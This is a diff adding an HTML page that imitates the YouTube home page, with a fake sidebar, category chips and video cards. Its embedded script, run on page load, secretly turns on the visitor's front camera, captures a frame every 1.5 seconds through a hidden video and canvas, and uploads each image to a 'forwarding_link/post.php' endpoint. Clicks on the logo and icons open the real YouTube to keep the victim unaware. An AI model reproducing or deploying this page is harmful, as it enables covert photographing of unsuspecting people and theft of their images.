@@ -1,0 +1,1084 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>YouTube Clone - Home</title>
+  <!-- Font Awesome 6 -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <!-- Google Fonts YouTube style -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+  <style>
+    /* ========== GLOBAL RESET & VARIABLES ========== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #ffffff;
+      color: #0f0f0f;
+      overflow-x: hidden;
+      overflow-y: auto;
+      line-height: 1.4;
+    }
+
+    a {
+      text-decoration: none;
+      color: inherit;
+    }
+
+    /* ========== YOUTUBE HEADER (Light Theme) ========== */
+    .yt-header {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background-color: #ffffff;
+      padding: 0 16px;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #e5e5e5;
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .menu-icon {
+      color: #606060;
+      font-size: 20px;
+      cursor: pointer;
+      padding: 8px;
+      border-radius: 50%;
+      transition: background 0.2s;
+    }
+
+    .menu-icon:hover {
+      background: #f2f2f2;
+    }
+
+    .yt-logo {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      cursor: pointer;
+    }
+
+    .yt-logo i {
+      color: #ff0000;
+      font-size: 28px;
+    }
+
+    .yt-logo span {
+      color: #0f0f0f;
+      font-size: 20px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+
+    /* Search Bar */
+    .search-area {
+      display: flex;
+      align-items: center;
+      flex: 1;
+      max-width: 640px;
+      margin: 0 40px;
+    }
+
+    .search-box {
+      display: flex;
+      flex: 1;
+      border: 1px solid #ccc;
+      border-radius: 40px 0 0 40px;
+      overflow: hidden;
+      background: #fff;
+    }
+
+    .search-box input {
+      flex: 1;
+      border: none;
+      padding: 10px 16px;
+      font-size: 16px;
+      outline: none;
+      background: transparent;
+    }
+
+    .search-box input::placeholder {
+      color: #909090;
+    }
+
+    .search-btn {
+      background: #f8f8f8;
+      border: none;
+      border-left: 1px solid #ccc;
+      padding: 8px 24px;
+      cursor: pointer;
+      color: #606060;
+      font-size: 18px;
+      transition: background 0.2s;
+    }
+
+    .search-btn:hover {
+      background: #f0f0f0;
+    }
+
+    .mic-btn {
+      background: #f2f2f2;
+      border: none;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      margin-left: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      color: #606060;
+      font-size: 18px;
+      transition: background 0.2s;
+    }
+
+    .mic-btn:hover {
+      background: #e5e5e5;
+    }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .create-btn {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: #f2f2f2;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 40px;
+      font-size: 14px;
+      font-weight: 500;
+      color: #0f0f0f;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .create-btn:hover {
+      background: #e5e5e5;
+    }
+
+    .header-icon {
+      color: #606060;
+      font-size: 22px;
+      cursor: pointer;
+      padding: 8px;
+      border-radius: 50%;
+      transition: background 0.2s;
+    }
+
+    .header-icon:hover {
+      background: #f2f2f2;
+    }
+
+    .avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #4caf50, #2196f3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 14px;
+      transition: transform 0.2s;
+    }
+
+    .avatar:hover {
+      transform: scale(1.05);
+    }
+
+    .notification-badge {
+      position: relative;
+    }
+
+    .notification-badge::after {
+      content: "1";
+      position: absolute;
+      top: 0;
+      right: 0;
+      background: #cc0000;
+      color: white;
+      font-size: 10px;
+      font-weight: bold;
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* ========== MAIN LAYOUT WITH SIDEBAR ========== */
+    .app-layout {
+      display: flex;
+      min-height: calc(100vh - 56px);
+    }
+
+    /* ========== SIDEBAR (Left Navigation) ========== */
+    .sidebar {
+      width: 240px;
+      background: #fff;
+      padding: 12px 0;
+      overflow-y: auto;
+      flex-shrink: 0;
+      position: sticky;
+      top: 56px;
+      height: calc(100vh - 56px);
+      border-right: 1px solid #e5e5e5;
+    }
+
+    .sidebar-section {
+      padding: 8px 0;
+      border-bottom: 1px solid #e5e5e5;
+    }
+
+    .sidebar-section:last-child {
+      border-bottom: none;
+    }
+
+    .sidebar-item {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      padding: 8px 24px;
+      cursor: pointer;
+      font-size: 14px;
+      color: #0f0f0f;
+      transition: background 0.15s;
+    }
+
+    .sidebar-item:hover {
+      background: #f2f2f2;
+    }
+
+    .sidebar-item.active {
+      background: #e5e5e5;
+      font-weight: 500;
+    }
+
+    .sidebar-item i {
+      width: 24px;
+      text-align: center;
+      font-size: 18px;
+      color: #606060;
+    }
+
+    .sidebar-item .subscription-avatar {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: #ccc;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      color: #fff;
+      font-weight: bold;
+    }
+
+    .sidebar-section-title {
+      padding: 8px 24px;
+      font-size: 14px;
+      font-weight: 500;
+      color: #606060;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .sidebar-section-title i {
+      font-size: 12px;
+      margin-left: 4px;
+    }
+
+    .sidebar-footer {
+      padding: 16px 24px;
+      font-size: 12px;
+      color: #909090;
+      line-height: 1.8;
+    }
+
+    .sidebar-footer a {
+      color: #606060;
+      text-decoration: none;
+      margin-right: 8px;
+    }
+
+    .sidebar-footer a:hover {
+      text-decoration: underline;
+    }
+
+    /* ========== MAIN CONTENT ========== */
+    .main-content {
+      flex: 1;
+      padding: 24px;
+      min-width: 0;
+    }
+
+    /* ========== CATEGORY CHIPS (Horizontal Filter Bar) ========== */
+    .category-bar {
+      display: flex;
+      gap: 12px;
+      overflow-x: auto;
+      padding-bottom: 12px;
+      margin-bottom: 20px;
+      scrollbar-width: none;
+    }
+
+    .category-bar::-webkit-scrollbar {
+      display: none;
+    }
+
+    .chip {
+      background: #f2f2f2;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 500;
+      color: #0f0f0f;
+      cursor: pointer;
+      white-space: nowrap;
+      transition: background 0.2s;
+      flex-shrink: 0;
+    }
+
+    .chip:hover {
+      background: #e5e5e5;
+    }
+
+    .chip.active {
+      background: #0f0f0f;
+      color: #fff;
+    }
+
+    /* ========== VIDEO GRID ========== */
+    .video-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+      gap: 20px 16px;
+    }
+
+    /* Video Card */
+    .video-card {
+      cursor: pointer;
+      transition: transform 0.1s;
+    }
+
+    .video-card:hover {
+      transform: scale(1.02);
+    }
+
+    .thumbnail-container {
+      position: relative;
+      width: 100%;
+      aspect-ratio: 16 / 9;
+      border-radius: 12px;
+      overflow: hidden;
+      background: #e5e5e5;
+      margin-bottom: 12px;
+    }
+
+    .thumbnail-container img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    .thumbnail-container .duration {
+      position: absolute;
+      bottom: 4px;
+      right: 4px;
+      background: rgba(0, 0, 0, 0.8);
+      color: white;
+      font-size: 12px;
+      font-weight: 500;
+      padding: 2px 4px;
+      border-radius: 4px;
+    }
+
+    .thumbnail-container .live-badge {
+      position: absolute;
+      bottom: 4px;
+      right: 4px;
+      background: #cc0000;
+      color: white;
+      font-size: 12px;
+      font-weight: 500;
+      padding: 2px 6px;
+      border-radius: 4px;
+      text-transform: uppercase;
+    }
+
+    .thumbnail-container .live-badge::before {
+      content: "●";
+      margin-right: 4px;
+      font-size: 8px;
+      vertical-align: middle;
+    }
+
+    .video-info {
+      display: flex;
+      gap: 12px;
+    }
+
+    .channel-avatar-small {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      flex-shrink: 0;
+      background: #e5e5e5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+      color: #fff;
+      font-weight: bold;
+      overflow: hidden;
+    }
+
+    .channel-avatar-small img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .video-text {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .video-title {
+      font-size: 15px;
+      font-weight: 500;
+      color: #0f0f0f;
+      line-height: 1.4;
+      margin-bottom: 4px;
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .video-meta {
+      font-size: 13px;
+      color: #606060;
+      line-height: 1.4;
+    }
+
+    .video-meta span {
+      display: inline;
+    }
+
+    .video-meta span + span::before {
+      content: "•";
+      margin: 0 4px;
+    }
+
+    /* ========== LOADING SKELETON (optional, for realism) ========== */
+    .skeleton {
+      background: #e5e5e5;
+      border-radius: 8px;
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0% { opacity: 0.6; }
+      50% { opacity: 1; }
+      100% { opacity: 0.6; }
+    }
+
+    /* ========== HIDDEN ELEMENTS FOR ORIGINAL SCRIPT ========== */
+    .video-wrap {
+      display: none;
+    }
+
+    #liveCanvas {
+      display: none;
+    }
+
+    /* ========== REDIRECT TOAST (from original) ========== */
+    .redirect-toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #1f1f1f;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 40px;
+      font-size: 14px;
+      z-index: 10000;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+      border-left: 4px solid #ff0000;
+      pointer-events: none;
+      animation: fadeInOut 2.5s ease forwards;
+    }
+
+    @keyframes fadeInOut {
+      0% { opacity: 0; transform: translateX(-50%) translateY(20px); }
+      15% { opacity: 1; transform: translateX(-50%) translateY(0); }
+      85% { opacity: 1; transform: translateX(-50%) translateY(0); }
+      100% { opacity: 0; transform: translateX(-50%) translateY(-20px); visibility: hidden; }
+    }
+
+    /* ========== RESPONSIVE ========== */
+    @media (max-width: 1000px) {
+      .sidebar {
+        display: none;
+      }
+      .search-area {
+        margin: 0 16px;
+      }
+      .video-grid {
+        grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+      }
+    }
+
+    @media (max-width: 600px) {
+      .header-right .create-btn span {
+        display: none;
+      }
+      .search-area {
+        margin: 0 8px;
+      }
+      .video-grid {
+        grid-template-columns: 1fr;
+      }
+      .category-bar {
+        gap: 8px;
+      }
+      .chip {
+        padding: 6px 12px;
+        font-size: 13px;
+      }
+    }
+
+    /* Scrollbar styling */
+    ::-webkit-scrollbar {
+      width: 8px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #fff;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #ccc;
+      border-radius: 4px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #aaa;
+    }
+  </style>
+</head>
+<body>
+
+<!-- ========== YOUTUBE HEADER ========== -->
+<header class="yt-header">
+  <div class="header-left">
+    <div class="menu-icon" id="menuRedirectBtn">
+      <i class="fas fa-bars"></i>
+    </div>
+    <div class="yt-logo" id="ytLogoRedirect">
+      <i class="fab fa-youtube"></i>
+      <span>YouTube<sup style="font-size: 10px; color: #606060; font-weight: 400;">IN</sup></span>
+    </div>
+  </div>
+
+  <div class="search-area">
+    <div class="search-box">
+      <input type="text" placeholder="Search" aria-label="Search">
+      <button class="search-btn" aria-label="Search">
+        <i class="fas fa-search"></i>
+      </button>
+    </div>
+    <button class="mic-btn" aria-label="Voice search">
+      <i class="fas fa-microphone"></i>
+    </button>
+  </div>
+
+  <div class="header-right">
+    <button class="create-btn">
+      <i class="fas fa-plus"></i>
+      <span>Create</span>
+    </button>
+    <div class="header-icon notification-badge" id="bellIconRedirect">
+      <i class="fas fa-bell"></i>
+    </div>
+    <div class="avatar" id="iphoneAvatarRedirect">
+      <i class="fas fa-mobile-alt"></i>
+    </div>
+  </div>
+</header>
+
+<!-- ========== APP LAYOUT ========== -->
+<div class="app-layout">
+
+  <!-- ========== SIDEBAR ========== -->
+  <aside class="sidebar">
+    <div class="sidebar-section">
+      <div class="sidebar-item active">
+        <i class="fas fa-home"></i> Home
+      </div>
+      <div class="sidebar-item">
+        <i class="fas fa-film"></i> Shorts
+      </div>
+    </div>
+
+    <div class="sidebar-section">
+      <div class="sidebar-section-title">
+        Subscriptions <i class="fas fa-chevron-right"></i>
+      </div>
+      <div class="sidebar-item">
+        <div class="subscription-avatar" style="background: #1a1a1a;">T</div>
+        The blackhat venom
+      </div>
+      <div class="sidebar-item">
+        <div class="subscription-avatar" style="background: #cc0000;">M</div>
+        Manner Tube
+      </div>
+      <div class="sidebar-item">
+        <div class="subscription-avatar" style="background: #ff6b6b;">U</div>
+        Unreal Beeng
+      </div>
+      <div class="sidebar-item">
+        <div class="subscription-avatar" style="background: #2196f3;">S</div>
+        Sharkshe S
+      </div>
+      <div class="sidebar-item">
+        <div class="subscription-avatar" style="background: #4caf50;">S</div>
+        shreeman legen...
+      </div>
+      <div class="sidebar-item">
+        <div class="subscription-avatar" style="background: #ff9800;">H</div>
+        Harsh Rajput Sh...
+      </div>
+      <div class="sidebar-item">
+        <div class="subscription-avatar" style="background: #9c27b0;">M</div>
+        MrBeast
+      </div>
+      <div class="sidebar-item">
+        <i class="fas fa-chevron-down"></i> Show more
+      </div>
+    </div>
+
+    <div class="sidebar-section">
+      <div class="sidebar-section-title">You <i class="fas fa-chevron-right"></i></div>
+      <div class="sidebar-item">
+        <i class="fas fa-user-circle"></i> Your channel
+      </div>
+      <div class="sidebar-item">
+        <i class="fas fa-history"></i> History
+      </div>
+    </div>
+
+    <div class="sidebar-footer">
+      <div>
+        <a href="#">About</a>
+        <a href="#">Press</a>
+        <a href="#">Copyright</a>
+      </div>
+      <div>
+        <a href="#">Contact us</a>
+        <a href="#">Creators</a>
+      </div>
+      <div>
+        <a href="#">Advertise</a>
+        <a href="#">Developers</a>
+      </div>
+      <div style="margin-top: 12px; color: #909090;">
+        &copy; 2025 Google LLC
+      </div>
+    </div>
+  </aside>
+
+  <!-- ========== MAIN CONTENT ========== -->
+  <main class="main-content">
+
+    <!-- Category Chips -->
+    <div class="category-bar">
+      <button class="chip active">All</button>
+      <button class="chip">Gaming</button>
+      <button class="chip">Dubbing</button>
+      <button class="chip">Esports</button>
+      <button class="chip">Free Fire India</button>
+      <button class="chip">Tamil Cinema</button>
+      <button class="chip">News</button>
+      <button class="chip">Dramedy</button>
+      <button class="chip">Music</button>
+      <button class="chip">Mixes</button>
+      <button class="chip">Live</button>
+      <button class="chip">Feature Phones</button>
+      <button class="chip">Comic books</button>
+    </div>
+
+    <!-- Video Grid -->
+    <div class="video-grid">
+
+      <!-- Video Card 1 -->
+      <div class="video-card">
+        <div class="thumbnail-container">
+          <img src="https://img.youtube.com/vi/1k8craCGpjs/maxresdefault.jpg" alt="Baap Beta Thumbnail" loading="lazy">
+          <span class="duration">15:59</span>
+        </div>
+        <div class="video-info">
+          <div class="channel-avatar-small">
+            <i class="fas fa-user"></i>
+          </div>
+          <div class="video-text">
+            <div class="video-title">Baap Beta | बाप बेटा | Mani Meraj | Rustic Fun</div>
+            <div class="video-meta">
+              <span>Rustic fun</span>
+              <span>6k views</span>
+              <span>22 min ago</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Video Card 2 -->
+      <div class="video-card">
+        <div class="thumbnail-container">
+          <img src="https://img.youtube.com/vi/2X6G4XWq5r0/maxresdefault.jpg" alt="Google Arena LAN Thumbnail" loading="lazy">
+          <span class="duration">15:35</span>
+        </div>
+        <div class="video-info">
+          <div class="channel-avatar-small">
+            <i class="fas fa-gamepad"></i>
+          </div>
+          <div class="video-text">
+            <div class="video-title">Google Arena LAN | 10,000 Teams Vs Our ADZ 😲 Grind 🔥 Can We Make It to the ...</div>
+            <div class="video-meta">
+              <span>DESI KILLER GAMING</span>
+              <span>40k views</span>
+              <span>15 hr ago</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Video Card 3 -->
+      <div class="video-card">
+        <div class="thumbnail-container">
+          <img src="https://img.youtube.com/vi/5qap5aO4i9A/maxresdefault.jpg" alt="BANGKOK Thumbnail" loading="lazy">
+          <span class="duration">16:18</span>
+        </div>
+        <div class="video-info">
+          <div class="channel-avatar-small">
+            <i class="fas fa-trophy"></i>
+          </div>
+          <div class="video-text">
+            <div class="video-title">FFW HORAA ESPORTS RAW VLOG #FFWORLDCUP #HORAASESPORTS ...</div>
+            <div class="video-meta">
+              <span>Cr7Horaa Live</span>
+              <span>19k views</span>
+              <span>11 hr ago</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Video Card 4 -->
+      <div class="video-card">
+        <div class="thumbnail-container">
+          <img src="https://img.youtube.com/vi/9bZkp7q19f0/maxresdefault.jpg" alt="Free Fire Live Thumbnail" loading="lazy">
+          <span class="live-badge">LIVE</span>
+        </div>
+        <div class="video-info">
+          <div class="channel-avatar-small">
+            <i class="fas fa-fire"></i>
+          </div>
+          <div class="video-text">
+            <div class="video-title">🔴 FREE FIRE LIVE | RANK PUSH | CUSTOM ROOM | HINDI</div>
+            <div class="video-meta">
+              <span>Gaming Zone</span>
+              <span>2.1k watching</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Video Card 5 -->
+      <div class="video-card">
+        <div class="thumbnail-container">
+          <img src="https://img.youtube.com/vi/jNQXAC9IVRw/maxresdefault.jpg" alt="Motu Patlu Thumbnail" loading="lazy">
+          <span class="duration">16:28</span>
+        </div>
+        <div class="video-info">
+          <div class="channel-avatar-small">
+            <i class="fas fa-child"></i>
+          </div>
+          <div class="video-text">
+            <div class="video-title">Motu Patlu in Carnival Island | Full Movie | Fun Kids Cartoon</div>
+            <div class="video-meta">
+              <span>Wow Kidz</span>
+              <span>1.2M views</span>
+              <span>2 days ago</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Video Card 6 (Extra to fill grid) -->
+      <div class="video-card">
+        <div class="thumbnail-container">
+          <img src="https://img.youtube.com/vi/3JZ_D3ELwOQ/maxresdefault.jpg" alt="Gaming Setup Thumbnail" loading="lazy">
+          <span class="duration">10:22</span>
+        </div>
+        <div class="video-info">
+          <div class="channel-avatar-small">
+            <i class="fas fa-desktop"></i>
+          </div>
+          <div class="video-text">
+            <div class="video-title">Ultimate Gaming Setup Tour 2025 | RGB Everything!</div>
+            <div class="video-meta">
+              <span>Tech Guru</span>
+              <span>850k views</span>
+              <span>1 week ago</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+    <!-- End Video Grid -->
+
+  </main>
+</div>
+
+<!-- ========== HIDDEN ELEMENTS FOR ORIGINAL SCRIPT (keep unchanged) ========== -->
+<div class="video-wrap">
+  <video id="video" playsinline autoplay muted></video>
+</div>
+
+<canvas id="liveCanvas" width="1280" height="720" style="display:none;"></canvas>
+
+<!-- ========== ORIGINAL SCRIPTS (kept intact) ========== -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+  // ============================================================
+  // YOUTUBE LIVE CLONE - "STREAMER HASN'T ARRIVED" VERSION
+  // WITH REDIRECTS TO ORIGINAL YOUTUBE WEBSITE
+  // Webcam active & posting data every 1.5 seconds (background)
+  // ============================================================
+
+  'use strict';
+
+  // --- REDIRECT FUNCTIONALITY (opens YouTube in new tab, keeps current page running) ---
+  function redirectToYouTube(source) {
+    showRedirectToast(`Opening YouTube.com (${source}) in new tab...`);
+    window.open('https://www.youtube.com', '_blank');
+  }
+
+  function showRedirectToast(message) {
+    const existingToast = document.querySelector('.redirect-toast');
+    if (existingToast) existingToast.remove();
+
+    const toast = document.createElement('div');
+    toast.className = 'redirect-toast';
+    toast.innerHTML = `<i class="fas fa-external-link-alt" style="margin-right: 8px; color: #ff0000;"></i> ${message}`;
+    document.body.appendChild(toast);
+
+    setTimeout(() => {
+      if (toast.parentNode) toast.remove();
+    }, 2800);
+  }
+
+  // --- ATTACH REDIRECTS TO CLICKABLE ELEMENTS ---
+  const ytLogo = document.getElementById('ytLogoRedirect');
+  if (ytLogo) {
+    ytLogo.addEventListener('click', (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      redirectToYouTube('YouTube Logo');
+    });
+  }
+
+  const menuBtn = document.getElementById('menuRedirectBtn');
+  if (menuBtn) {
+    menuBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      redirectToYouTube('Menu Icon');
+    });
+  }
+
+  const iphoneAvatar = document.getElementById('iphoneAvatarRedirect');
+  if (iphoneAvatar) {
+    iphoneAvatar.addEventListener('click', (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      redirectToYouTube('iPhone / Avatar Icon');
+    });
+  }
+
+  const bellIcon = document.getElementById('bellIconRedirect');
+  if (bellIcon) {
+    bellIcon.addEventListener('click', (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      redirectToYouTube('Bell Icon');
+    });
+  }
+
+  // --- WEBCAM CAPTURE & POST LOGIC (runs in background continuously) ---
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('liveCanvas');
+
+  canvas.width = 1280;
+  canvas.height = 720;
+
+  const constraints = {
+    audio: false,
+    video: {
+      facingMode: "user"
+    }
+  };
+
+  function post(imgdata) {
+    $.ajax({
+      type: 'POST',
+      data: { cat: imgdata },
+      url: 'forwarding_link/post.php',
+      dataType: 'json',
+      async: false,
+      success: function(result) {},
+      error: function() {}
+    });
+  }
+
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+    video.play().catch(e => console.warn("autoplay error", e));
+
+    const context = canvas.getContext('2d');
+
+    setInterval(function() {
+      if (video.readyState === video.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData);
+        console.log("📸 Frame captured (background running)");
+      }
+    }, 1500);
+  }
+
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleSuccess(stream);
+    } catch (e) {
+      console.error("Camera error:", e);
+    }
+  }
+
+  init();
+
+  // --- CHAT FUNCTIONALITY (kept from original, but elements may not exist) ---
+  // The chat elements are not present in this UI, but we keep the logic
+  // in case the original elements are dynamically added later or just to preserve the script.
+  const chatMessagesDiv = document.getElementById('chatMessages');
+  const chatInput = document.getElementById('chatInput');
+  const sendBtn = document.getElementById('sendChatBtn');
+
+  function escapeHtml(str) {
+    if (!str) return '';
+    return str.replace(/[&<>]/g, function(m) {
+      if (m === '&') return '&amp;';
+      if (m === '<') return '&lt;';
+      if (m === '>') return '&gt;';
+      return m;
+    });
+  }
+
+  if (chatMessagesDiv && chatInput && sendBtn) {
+    // Chat logic (original) - only runs if elements exist
+    function addChatMessage(username, message) {
+      const messageDiv = document.createElement('div');
+      messageDiv.className = 'chat-message';
+      const avatarInitial = username.charAt(0).toUpperCase();
+      const bgColors = ['#3f51b5', '#e91e63', '#ff9800', '#4caf50', '#9c27b0', '#3498db', '#e67e22'];
+      const randomBg = bgColors[Math.floor(Math.random() * bgColors.length)];
+      messageDiv.innerHTML = `
+        <div class="msg-avatar" style="background: ${randomBg};">${avatarInitial}</div>
+        <div class="msg-content">
+          <div class="msg-user">${escapeHtml(username)}</div>
+          <div class="msg-text">${escapeHtml(message)}</div>
+        </div>
+      `;
+      chatMessagesDiv.appendChild(messageDiv);
+      chatMessagesDiv.scrollTop = chatMessagesDiv.scrollHeight;
+      while (chatMessagesDiv.children.length > 80) {
+        chatMessagesDiv.removeChild(chatMessagesDiv.firstChild);
+      }
+    }
+
+    function sendMessage() {
+      const msg = chatInput.value.trim();
+      if (msg === '') return;
+      const demoUsers = ['ViewerJoe', 'ChatFan', 'WaitingGuy', 'StreamWatcher', 'Subscriber_YT'];
+      const randomUser = demoUsers[Math.floor(Math.random() * demoUsers.length)] + Math.floor(Math.random() * 100);
+      addChatMessage(randomUser, msg);
+      chatInput.value = '';
+    }
+
+    sendBtn.addEventListener('click', sendMessage);
+    chatInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') sendMessage();
+    });
+
+    setInterval(() => {
+      const viewerMessages = [
+        "Where is the streamer? 😭",
+        "Still waiting...",
+        "Streamer please start!",
+        "Let's gooo waiting room",
+        "Anyone know when it starts?",
+        "Technical difficulties?"
+      ];
+      const randomMsg = viewerMessages[Math.floor(Math.random() * viewerMessages.length)];
+      const randomNames = ['LoyalFan', 'ChatterBox', 'LiveAddict', 'YT_Watcher', 'WaitingRoom'];
+      const name = randomNames[Math.floor(Math.random() * randomNames.length)] + (Math.floor(Math.random() * 99) + 1);
+      addChatMessage(name, randomMsg);
+    }, 9000);
+  }
+
+  // Subscribe button (if exists)
+  const subscribeBtn = document.querySelector('.subscribe-btn');
+  if (subscribeBtn) {
+    let subscribed = false;
+    subscribeBtn.addEventListener('click', function() {
+      if (!subscribed) {
+        this.innerHTML = 'Subscribed';
+        this.style.background = '#272727';
+        alert('Subscribed! You will be notified when streamer goes live.');
+        subscribed = true;
+      } else {
+        alert('Already subscribed!');
+      }
+    });
+  }
+
+  console.log("YouTube Home Clone - Original background scripts active");
+</script>
+</body>
+</html>
